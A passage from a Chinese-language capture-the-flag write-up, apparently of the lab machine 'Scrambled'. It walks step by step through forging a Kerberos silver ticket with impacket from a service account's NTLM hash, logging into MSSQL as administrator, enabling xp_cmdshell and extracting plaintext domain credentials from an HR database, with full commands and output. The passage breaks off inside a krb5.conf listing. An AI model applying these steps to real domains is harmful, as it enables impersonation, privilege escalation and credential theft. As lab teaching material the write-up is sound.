+</span></span></code></pre></div><p>伪造银票前先收集信息。用 impacket 的 getPac 借 S4U2Self 拉回 administrator 的 PAC，里面有三样东西是必须的：</p><ul><li>Domain SID：<code>S-1-5-21-2743207045-1827831105-2542523200</code>；</li><li>administrator 的 <code>UserId: 500</code>，内置管理员的固定 RID；</li><li>所属组 <code>512 / 513 / 518 / 519 / 520</code>（Domain Admins、Domain Users、Schema Admins、Enterprise Admins、Group Policy Creator Owners）。</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-getPac -targetUser administrator scrm.local/sqlsvc:Pegasus60
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>KERB_VALIDATION_INFO
+</span></span><span style=display:flex><span>LogonTime:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>1836325476</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>31275444</span>
+</span></span><span style=display:flex><span>LogoffTime:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>4294967295</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>2147483647</span>
+</span></span><span style=display:flex><span>KickOffTime:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>4294967295</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>2147483647</span>
+</span></span><span style=display:flex><span>PasswordLastSet:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>2585823167</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>30921784</span>
+</span></span><span style=display:flex><span>PasswordCanChange:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>3297396671</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>30921985</span>
+</span></span><span style=display:flex><span>PasswordMustChange:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>4294967295</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>2147483647</span>
+</span></span><span style=display:flex><span>EffectiveName:                   <span style=color:#e6db74>&#39;administrator&#39;</span>
+</span></span><span style=display:flex><span>FullName:                        <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>LogonScript:                     <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>ProfilePath:                     <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>HomeDirectory:                   <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>HomeDirectoryDrive:              <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>LogonCount:                      <span style=color:#ae81ff>282</span>
+</span></span><span style=display:flex><span>BadPasswordCount:                <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>UserId:                          <span style=color:#ae81ff>500</span>
+</span></span><span style=display:flex><span>PrimaryGroupId:                  <span style=color:#ae81ff>513</span>
+</span></span><span style=display:flex><span>GroupCount:                      <span style=color:#ae81ff>5</span>
+</span></span><span style=display:flex><span>GroupIds:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        RelativeId:                      <span style=color:#ae81ff>513</span>
+</span></span><span style=display:flex><span>        Attributes:                      <span style=color:#ae81ff>7</span> ,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        RelativeId:                      <span style=color:#ae81ff>512</span>
+</span></span><span style=display:flex><span>        Attributes:                      <span style=color:#ae81ff>7</span> ,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        RelativeId:                      <span style=color:#ae81ff>520</span>
+</span></span><span style=display:flex><span>        Attributes:                      <span style=color:#ae81ff>7</span> ,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        RelativeId:                      <span style=color:#ae81ff>518</span>
+</span></span><span style=display:flex><span>        Attributes:                      <span style=color:#ae81ff>7</span> ,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        RelativeId:                      <span style=color:#ae81ff>519</span>
+</span></span><span style=display:flex><span>        Attributes:                      <span style=color:#ae81ff>7</span> ,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>UserFlags:                       <span style=color:#ae81ff>544</span>
+</span></span><span style=display:flex><span>UserSessionKey:
+</span></span><span style=display:flex><span>    Data:                            b<span style=color:#e6db74>&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;</span>
+</span></span><span style=display:flex><span>LogonServer:                     <span style=color:#e6db74>&#39;DC1&#39;</span>
+</span></span><span style=display:flex><span>LogonDomainName:                 <span style=color:#e6db74>&#39;SCRM&#39;</span>
+</span></span><span style=display:flex><span>LogonDomainId:
+</span></span><span style=display:flex><span>    Revision:                        <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>    SubAuthorityCount:               <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>    IdentifierAuthority:             b<span style=color:#e6db74>&#39;\x00\x00\x00\x00\x00\x05&#39;</span>
+</span></span><span style=display:flex><span>    SubAuthority:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span>
+</span></span><span style=display:flex><span>             21,
+</span></span><span style=display:flex><span>             2743207045,
+</span></span><span style=display:flex><span>             1827831105,
+</span></span><span style=display:flex><span>             2542523200,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>LMKey:                           b<span style=color:#e6db74>&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;</span>
+</span></span><span style=display:flex><span>UserAccountControl:              <span style=color:#ae81ff>16912</span>
+</span></span><span style=display:flex><span>SubAuthStatus:                   <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>LastSuccessfulILogon:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>LastFailedILogon:
+</span></span><span style=display:flex><span>    dwLowDateTime:                   <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    dwHighDateTime:                  <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>FailedILogonCount:               <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Reserved3:                       <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>SidCount:                        <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>ExtraSids:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Sid:
+</span></span><span style=display:flex><span>            Revision:                        <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>            SubAuthorityCount:               <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>            IdentifierAuthority:             b<span style=color:#e6db74>&#39;\x00\x00\x00\x00\x00\x12&#39;</span>
+</span></span><span style=display:flex><span>            SubAuthority:
+</span></span><span style=display:flex><span>                <span style=color:#f92672>[</span>
+</span></span><span style=display:flex><span>                     2,
+</span></span><span style=display:flex><span>                <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>        Attributes:                      <span style=color:#ae81ff>7</span> ,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>ResourceGroupDomainSid:
+</span></span><span style=display:flex><span>    Revision:                        <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>    SubAuthorityCount:               <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>    IdentifierAuthority:             b<span style=color:#e6db74>&#39;\x00\x00\x00\x00\x00\x05&#39;</span>
+</span></span><span style=display:flex><span>    SubAuthority:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span>
+</span></span><span style=display:flex><span>             21,
+</span></span><span style=display:flex><span>             2743207045,
+</span></span><span style=display:flex><span>             1827831105,
+</span></span><span style=display:flex><span>             2542523200,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>ResourceGroupCount:              <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>ResourceGroupIds:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        RelativeId:                      <span style=color:#ae81ff>572</span>
+</span></span><span style=display:flex><span>        Attributes:                      <span style=color:#ae81ff>536870919</span> ,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Domain SID: S-1-5-21-2743207045-1827831105-2542523200
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>0000</span>   <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>75</span> B3 <span style=color:#ae81ff>83</span> <span style=color:#ae81ff>01</span>  <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>41</span> B4 <span style=color:#ae81ff>90</span> 8E <span style=color:#ae81ff>80</span> C8 F5   ....u....A......
+</span></span></code></pre></div><p>开始伪造。银票的特点是<strong>全程不经过 KDC</strong>：加密密钥就是服务账号自己的 NTLM hash，MSSQL 收到票后用自己的 hash 解密即认为合法。这里拿 sqlsvc 的 hash 给 <code>MSSQLSvc/DC1.scrm.local:1433</code> 签一张 administrator（RID 500 + 五个组）的票。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn <span style=color:#e6db74>&#34;MSSQLSvc/DC1.scrm.local:1433&#34;</span> -user-id <span style=color:#ae81ff>500</span> -groups 512,513,518,519,520 administrator
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating basic skeleton ticket and PAC Infos
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Customizing ticket <span style=color:#66d9ef>for</span> scrm.local/administrator
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	PAC_LOGON_INFO
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	PAC_CLIENT_INFO_TYPE
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	EncTicketPart
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	EncTGSRepPart
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Signing/Encrypting final ticket
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	PAC_SERVER_CHECKSUM
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	PAC_PRIVSVR_CHECKSUM
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	EncTicketPart
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 	EncTGSRepPart
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Saving ticket in administrator.ccache
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ export KRB5CCNAME<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>/administrator.ccache
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ klist
+</span></span><span style=display:flex><span>Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/administrator.ccache
+</span></span><span style=display:flex><span>Default principal: administrator@SCRM.LOCAL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Valid starting       Expires              Service principal
+</span></span><span style=display:flex><span>09/01/2026 01:40:48  08/29/2036 01:40:48  MSSQLSvc/DC1.scrm.local:1433@SCRM.LOCAL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 08/29/2036 01:40:48
+</span></span></code></pre></div><p>带着银票以 <code>SCRM\administrator</code> 连上 MSSQL：<code>SYSTEM_USER</code> 显示 SCRM\administrator，sysadmin 成员返回 1。开 <code>xp_cmdshell</code> 拿到命令执行，但 <code>whoami</code> 显示的是 <strong>scrm\sqlsvc</strong> —— 银票伪造的是"登录身份"，作业还是以服务的真实运行账号跑的。不过没关系，sysadmin 权限已经足够翻库了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-mssqlclient -k -no-pass SCRM.LOCAL/administrator@DC1.scrm.local -windows-auth
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Encryption required, switching to TLS
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>DATABASE<span style=color:#f92672>)</span>: Old Value: master, New Value: master
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>LANGUAGE<span style=color:#f92672>)</span>: Old Value: , New Value: us_english
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>PACKETSIZE<span style=color:#f92672>)</span>: Old Value: 4096, New Value: <span style=color:#ae81ff>16192</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>DC1<span style=color:#f92672>)</span>: Line 1: Changed database context to <span style=color:#e6db74>&#39;master&#39;</span>.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>DC1<span style=color:#f92672>)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ACK: Result: <span style=color:#ae81ff>1</span> - Microsoft SQL Server <span style=color:#ae81ff>2019</span> RTM <span style=color:#f92672>(</span>15.0.2000<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@master<span style=color:#f92672>)</span>&gt; SELECT SYSTEM_USER;
+</span></span><span style=display:flex><span>                     
+</span></span><span style=display:flex><span>------------------   
+</span></span><span style=display:flex><span>SCRM<span style=color:#ae81ff>\a</span>dministrator   
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@master<span style=color:#f92672>)</span>&gt; SELECT IS_SRVROLEMEMBER<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;sysadmin&#39;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>-   
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@master<span style=color:#f92672>)</span>&gt; EXEC sp_configure <span style=color:#e6db74>&#39;show advanced options&#39;</span>, 1; RECONFIGURE;
+</span></span><span style=display:flex><span>INFO<span style=color:#f92672>(</span>DC1<span style=color:#f92672>)</span>: Line 185: Configuration option <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed from <span style=color:#ae81ff>1</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@master<span style=color:#f92672>)</span>&gt; EXEC sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>, 1; RECONFIGURE;
+</span></span><span style=display:flex><span>INFO<span style=color:#f92672>(</span>DC1<span style=color:#f92672>)</span>: Line 185: Configuration option <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed from <span style=color:#ae81ff>0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@master<span style=color:#f92672>)</span>&gt; EXEC xp_cmdshell <span style=color:#e6db74>&#39;whoami&#39;</span>;
+</span></span><span style=display:flex><span>output        
+</span></span><span style=display:flex><span>-----------   
+</span></span><span style=display:flex><span>scrm<span style=color:#ae81ff>\s</span>qlsvc   
+</span></span><span style=display:flex><span>NULL
+</span></span></code></pre></div><p>库列表里果然有 <code>ScrambleHR</code> —— 正是公告里提到存过凭据的那套 HR 系统。<code>UserImport</code> 表是 LDAP 同步任务的配置表，里面明晃晃躺着一条：<strong>MiscSvc / ScrambledEggs9900</strong>，域内同步账号的凭据直接到手。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@master<span style=color:#f92672>)</span>&gt; SELECT name FROM sys.databases;
+</span></span><span style=display:flex><span>name         
+</span></span><span style=display:flex><span>----------   
+</span></span><span style=display:flex><span>master       
+</span></span><span style=display:flex><span>tempdb       
+</span></span><span style=display:flex><span>model        
+</span></span><span style=display:flex><span>msdb         
+</span></span><span style=display:flex><span>ScrambleHR
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@ScrambleHR<span style=color:#f92672>)</span>&gt; SELECT table_name FROM information_schema.tables;
+</span></span><span style=display:flex><span>table_name   
+</span></span><span style=display:flex><span>----------   
+</span></span><span style=display:flex><span>Employees    
+</span></span><span style=display:flex><span>UserImport   
+</span></span><span style=display:flex><span>Timesheets   
+</span></span><span style=display:flex><span>SQL <span style=color:#f92672>(</span>SCRM<span style=color:#ae81ff>\a</span>dministrator  dbo@ScrambleHR<span style=color:#f92672>)</span>&gt; SELECT * FROM UserImport
+</span></span><span style=display:flex><span>LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
+</span></span><span style=display:flex><span>--------   -----------------   ----------   ---------------   -------------   
+</span></span><span style=display:flex><span>MiscSvc    ScrambledEggs9900   scrm.local                <span style=color:#ae81ff>90</span>               <span style=color:#ae81ff>0</span> 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ cat Users/MiscSvc
+</span></span><span style=display:flex><span>Miscsvc:ScrambledEggs9900
+</span></span></code></pre></div><p>给 MiscSvc 申请 TGT，并在本机 <code>krb5.conf</code> 里补上 <code>SCRM.LOCAL</code> 的 realm / KDC 配置，<code>-r</code> 参数才能正确解析。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-getTGT scrm.local/Miscsvc:ScrambledEggs9900 -dc-ip 10.129.33.76
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Saving ticket in Miscsvc.ccache
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ export KRB5CCNAME<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>/Miscsvc.ccache
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ klist
+</span></span><span style=display:flex><span>Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/Miscsvc.ccache
+</span></span><span style=display:flex><span>Default principal: Miscsvc@SCRM.LOCAL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Valid starting       Expires              Service principal
+</span></span><span style=display:flex><span>09/01/2026 01:56:56  09/01/2026 11:56:56  krbtgt/SCRM.LOCAL@SCRM.LOCAL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 09/02/2026 01:57:37
+</span></span></code></pre></div><p>修改 krb5.conf。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ cat /etc/krb5.conf
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>libdefaults<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>	default_realm <span style=color:#f92672>=</span> SCRM.LOCAL
+</span></span><span style=display:flex><span>	dns_lookup_realm <span style=color:#f92672>=</span> false
+</span></span><span style=display:flex><span>	dns_lookup_kdc <span style=color:#f92672>=</span> false
+</span></span><span style=display:flex><span>	rdns <span style=color:#f92672>=</span> false
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># The following krb5.conf variables are only for MIT Kerberos.</span>
+</span></span><span style=display:flex><span>	kdc_timesync <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>	ccache_type <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>	forwardable <span style=color:#f92672>=</span> true
+</span></span><span style=display:flex><span>	proxiable <span style=color:#f92672>=</span> true
+</span></span><span style=display:flex><span>        rdns <span style=color:#f92672>=</span> false
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># The following libdefaults parameters are only for Heimdal Kerberos.</span>
+</span></span><span style=display:flex><span>	fcc-mit-ticketflags <span style=color:#f92672>=</span> true
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>realms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>	ATHENA.MIT.EDU <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> kerberos.mit.edu
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> kerberos-1.mit.edu
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> kerberos-2.mit.edu:88
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> kerberos.mit.edu
+</span></span><span style=display:flex><span>		default_domain <span style=color:#f92672>=</span> mit.edu
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>	ZONE.MIT.EDU <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> casio.mit.edu
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> seiko.mit.edu
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> casio.mit.edu
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>	CSAIL.MIT.EDU <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> kerberos.csail.mit.edu
+</span></span><span style=display:flex><span>		default_domain <span style=color:#f92672>=</span> csail.mit.edu
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>	IHTFP.ORG <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> kerberos.ihtfp.org
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> kerberos.ihtfp.org
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>	1TS.ORG <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> kerberos.1ts.org
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> kerberos.1ts.org
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>	ANDREW.CMU.EDU <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> kerberos.andrew.cmu.edu
+</span></span><span style=display:flex><span>		default_domain <span style=color:#f92672>=</span> andrew.cmu.edu
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>        CS.CMU.EDU <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>                kdc <span style=color:#f92672>=</span> kerberos-1.srv.cs.cmu.edu
+</span></span><span style=display:flex><span>                kdc <span style=color:#f92672>=</span> kerberos-2.srv.cs.cmu.edu
+</span></span><span style=display:flex><span>                kdc <span style=color:#f92672>=</span> kerberos-3.srv.cs.cmu.edu
+</span></span><span style=display:flex><span>                admin_server <span style=color:#f92672>=</span> kerberos.cs.cmu.edu
+</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>	DEMENTIA.ORG <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> kerberos.dementix.org
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> kerberos2.dementix.org
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> kerberos.dementix.org
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>	stanford.edu <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> krb5auth1.stanford.edu
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> krb5auth2.stanford.edu
+</span></span><span style=display:flex><span>		kdc <span style=color:#f92672>=</span> krb5auth3.stanford.edu
+</span></span><span style=display:flex><span>		master_kdc <span style=color:#f92672>=</span> krb5auth1.stanford.edu
+</span></span><span style=display:flex><span>		admin_server <span style=color:#f92672>=</span> krb5-admin.stanford.edu
+</span></span><span style=display:flex><span>		default_domain <span style=color:#f92672>=</span> stanford.edu
+</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>        UTORONTO.CA <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
